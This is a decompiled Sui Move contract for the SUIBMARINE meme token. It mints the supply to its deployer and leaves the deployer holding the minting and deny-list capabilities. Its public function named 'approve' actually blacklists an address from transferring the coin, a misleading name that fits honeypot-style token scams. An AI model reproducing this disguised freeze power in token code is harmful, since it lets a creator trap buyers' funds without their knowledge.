module 0xfec277edbec91231da31ca54fd92f541237ff7c53adeb2e3e7ad82f2028a7661::suibmarine {
    struct SUIBMARINE has drop {
        dummy_field: bool,
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIBMARINE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SUIBMARINE>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: SUIBMARINE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SUIBMARINE>(arg0, 2, b"SUIBMARINE", b"SUIBMARINE", b"SUIBMARINE IS THE PEPE BUT ON SUI", 0x1::option::none<0x2::url::Url>(), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SUIBMARINE>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<SUIBMARINE>(&mut v3, 100000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SUIBMARINE>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SUIBMARINE>>(v1, v4);
    }

    // decompiled from Move bytecode v6
}

